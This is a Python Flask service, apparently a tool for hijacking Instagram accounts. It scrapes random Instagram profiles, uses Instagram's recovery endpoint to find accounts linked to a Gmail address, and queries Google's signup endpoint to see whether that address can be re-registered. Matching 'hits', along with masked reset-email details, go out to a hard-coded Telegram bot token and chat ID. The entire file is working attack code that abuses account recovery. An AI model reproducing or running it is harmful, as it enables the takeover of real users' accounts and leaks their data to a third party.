from flask import Flask, request, jsonify
import requests
import re
import json
import os
import random
import string
import hashlib
import uuid
import threading
from user_agent import generate_user_agent
from random import choice, randrange
import time

app = Flask(__name__)

# Telegram bot bilgileriniz
TELEGRAM_BOT_TOKEN = "8322422660:AAE1_fln1V_vZizoe8UAgYGZcpEwpbuLWzE"
TELEGRAM_CHAT_ID = "8265958228"

# Global değişkenler
HITS = 0
BAD_IG = 0
BAD_EMAIL = 0
GOOD_IG = 0
ACCOUNTS_FOUND = 0
accounts_data = {}

# Instagram API endpoints
INSTAGRAM_RECOVERY_URL = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"
GOOGLE_ACCOUNTS_URL = "https://accounts.google.com"

def send_telegram_message(message):
    """Telegram'a mesaj gönder"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Telegram hatası: {e}")

def send_telegram_video():
    """Başlangıçta video gönder"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "video": "https://t.me/eizontoolz/3",
            "caption": " - By : [𝐄𝐢𝐳𝐨𝐧](t.me/D8N8D)",
            "parse_mode": "Markdown"
        }
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Telegram video hatası: {e}")

def get_google_tokens():
    """Google token'larını al"""
    try:
        chars = "azertyuiopmlkjhgfdsqwxcvbn"
        random_str1 = "".join(choice(chars) for _ in range(randrange(6, 9)))
        random_str2 = "".join(choice(chars) for _ in range(randrange(3, 9)))
        gaps_token = "".join(choice(chars) for _ in range(randrange(15, 30)))
        
        headers = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "User-Agent": generate_user_agent(),
        }
        
        response = requests.get(
            f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB",
            headers=headers
        )
        
        match = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            response.text
        )
        
        if match:
            token = match.group(2)
            cookies = {"__Host-GAPS": gaps_token}
            
            signup_headers = {
                "authority": "accounts.google.com",
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "origin": GOOGLE_ACCOUNTS_URL,
                "referer": "https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
                "User-Agent": generate_user_agent(),
            }
            
            signup_data = {
                "f.req": f'["{token}","{random_str1}","{random_str2}","{random_str1}","{random_str2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                "deviceinfo": '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            
            response = requests.post(
                f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                cookies=cookies,
                headers=signup_headers,
                data=signup_data
            )
            
            tl_token = str(response.text).split('",null,"')[1].split('"')[0]
            gaps_token = response.cookies.get_dict()["__Host-GAPS"]
            
            return f"{tl_token}//{gaps_token}"
            
    except Exception as e:
        print(f"Google token hatası: {e}")
        return None

def check_email_availability(email, google_tokens):
    """Email uygunluğunu kontrol et"""
    global BAD_EMAIL, HITS
    
    try:
        if "@" in email:
            email = email.split("@")[0]
            
        tl_token, gaps_token = google_tokens.split("//")
        cookies = {"__Host-GAPS": gaps_token}
        
        headers = {
            "authority": "accounts.google.com",
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
            "google-accounts-xsrf": "1",
            "origin": GOOGLE_ACCOUNTS_URL,
            "referer": f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl_token}",
            "User-Agent": generate_user_agent(),
        }
        
        params = {"TL": tl_token}
        data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl_token}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        
        response = requests.post(
            f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
            params=params,
            cookies=cookies,
            headers=headers,
            data=data
        )
        
        if '"gf.uar",1' in response.text:
            HITS += 1
            return True
        else:
            BAD_EMAIL += 1
            return False
            
    except Exception as e:
        print(f"Email kontrol hatası: {e}")
        return False

def check_instagram_account(email):
    """Instagram hesabını kontrol et"""
    global GOOD_IG, BAD_IG
    
    try:
        user_agent = generate_user_agent()
        device_id = "android-" + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
        adid = str(uuid.uuid4())
        
        headers = {
            "User-Agent": user_agent,
            "Cookie": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        }
        
        data = {
            "signed_body": "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f." + json.dumps({
                "_csrftoken": "9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
                "adid": adid,
                "guid": adid,
                "device_id": device_id,
                "query": email,
            }),
            "ig_sig_key_version": "4",
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data)
        
        if email in response.text:
            GOOD_IG += 1
            return True
        else:
            BAD_IG += 1
            return False
            
    except Exception as e:
        print(f"Instagram kontrol hatası: {e}")
        return False

def get_instagram_reset_info(username):
    """Instagram reset bilgilerini al"""
    try:
        headers = {
            "X-Pigeon-Session-Id": "50cc6861-7036-43b4-802e-fb4282799c60",
            "X-Pigeon-Rawclienttime": "1700251574.982",
            "X-IG-Connection-Speed": "-1kbps",
            "X-IG-Bandwidth-Speed-KBPS": "-1.000",
            "X-IG-Bandwidth-TotalBytes-B": "0",
            "X-IG-Bandwidth-TotalTime-MS": "0",
            "X-Bloks-Version-Id": "c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-App-ID": "567067343352427",
            "User-Agent": "Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)",
            "Accept-Language": "en-GB, en-US",
            "Cookie": "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip, deflate",
            "Host": "i.instagram.com",
            "X-FB-HTTP-Engine": "Liger",
            "Connection": "keep-alive",
        }
        
        data = {
            "signed_body": '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"' + username + '"}',
            "ig_sig_key_version": "4",
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data)
        result = response.json()
        return result.get("email", "Reset None")
    except:
        return "Reset None"

def process_account(username, domain):
    """Hesabı işle ve Telegram'a gönder"""
    global ACCOUNTS_FOUND
    
    account_data = accounts_data.get(username, {})
    pk = account_data.get("pk")
    full_name = account_data.get("full_name", "N/A")
    follower_count = account_data.get("follower_count", 0)
    following_count = account_data.get("following_count", 0)
    media_count = account_data.get("media_count", 0)
    biography = account_data.get("biography", "N/A")
    
    # Meta enable kontrolü
    meta_enabled = follower_count >= 10 and media_count >= 2
    
    ACCOUNTS_FOUND += 1
    reset_info = get_instagram_reset_info(username)
    
    message = f"""
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝒉𝒊𝒕 : [ {ACCOUNTS_FOUND} ]
𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 : [ {username} ]
𝒆𝒎𝒂𝒊𝒍 : [ {username}@{domain} ]
𝒇𝒐𝒍𝒍𝒐𝒘𝒆𝒓𝒔 : [ {follower_count} ]
𝒇𝒐𝒍𝒍𝒐𝒘𝒊𝒏𝒈 : [ {following_count} ]
𝒑𝒐𝒔𝒕𝒔 : [ {media_count} ]
𝒃𝒊𝒐 : [ {biography} ]
𝒓𝒆𝒔𝒆𝒕 : [ {reset_info} ]
✅ 𝗠ᴇᴛᴀ 𝗘ɴᴀʙʟᴇ ➟ {meta_enabled}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
[ 𝐏𝐑𝐎𝐆𝐑𝐀𝐌 : 𝐄𝐢𝐳𝐨𝐧 ]
"""
    
    # Dosyaya kaydet
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(message + "\n")
    
    # Telegram'a gönder
    send_telegram_message(message)
    
    return message

def scan_instagram_accounts():
    """Instagram hesaplarını tarama fonksiyonu"""
    global accounts_data
    
    while True:
        try:
            data = {
                "lsd": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
                "variables": json.dumps({
                    "id": str(random.randrange(2040000000, 2500000000)),
                    "render_surface": "PROFILE",
                }),
                "doc_id": "25618261841150840",
            }
            
            headers = {"X-FB-LSD": data["lsd"]}
            
            response = requests.post("https://www.instagram.com/api/graphql", headers=headers, data=data)
            user_data = response.json().get("data", {}).get("user", {})
            
            username = user_data.get("username")
            follower_count = user_data.get("follower_count", 0)
            
            if username and follower_count >= 4:  # Minimum 4 takipçi
                accounts_data[username] = user_data
                
                # Email kontrolü yap
                email = username + "@gmail.com"
                google_tokens = get_google_tokens()
                
                if google_tokens:
                    if check_instagram_account(email):
                        if check_email_availability(email, google_tokens):
                            process_account(username, "gmail.com")
                
        except Exception as e:
            print(f"Tarama hatası: {e}")
            time.sleep(5)

# API Endpoints
@app.route('/')
def home():
    return jsonify({
        "status": "active",
        "message": "Instagram Account Scanner API",
        "stats": {
            "hits": HITS,
            "bad_instagram": BAD_IG,
            "bad_email": BAD_EMAIL,
            "good_instagram": GOOD_IG,
            "accounts_found": ACCOUNTS_FOUND
        }
    })

@app.route('/start', methods=['POST'])
def start_scan():
    """Tarama başlatma endpoint'i"""
    try:
        # Arka planda tarama başlat
        thread = threading.Thread(target=scan_instagram_accounts, daemon=True)
        thread.start()
        
        # Başlangıç videosunu gönder
        send_telegram_video()
        
        return jsonify({
            "status": "success",
            "message": "Tarama başlatıldı",
            "telegram_chat_id": TELEGRAM_CHAT_ID
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/stats')
def get_stats():
    """İstatistikleri getir"""
    return jsonify({
        "hits": HITS,
        "bad_instagram": BAD_IG,
        "bad_email": BAD_EMAIL,
        "good_instagram": GOOD_IG,
        "accounts_found": ACCOUNTS_FOUND
    })

@app.route('/check-account', methods=['POST'])
def check_single_account():
    """Tek bir hesabı kontrol et"""
    try:
        data = request.get_json()
        username = data.get('username')
        
        if not username:
            return jsonify({"status": "error", "message": "Username gerekli"})
        
        email = username + "@gmail.com"
        google_tokens = get_google_tokens()
        
        result = {
            "username": username,
            "email": email,
            "instagram_active": check_instagram_account(email),
            "email_available": check_email_availability(email, google_tokens) if google_tokens else False
        }
        
        return jsonify({"status": "success", "data": result})
        
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

# Uygulama başlangıcında
if __name__ == '__main__':
    # Render'da çalışacak şekilde port ayarı
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
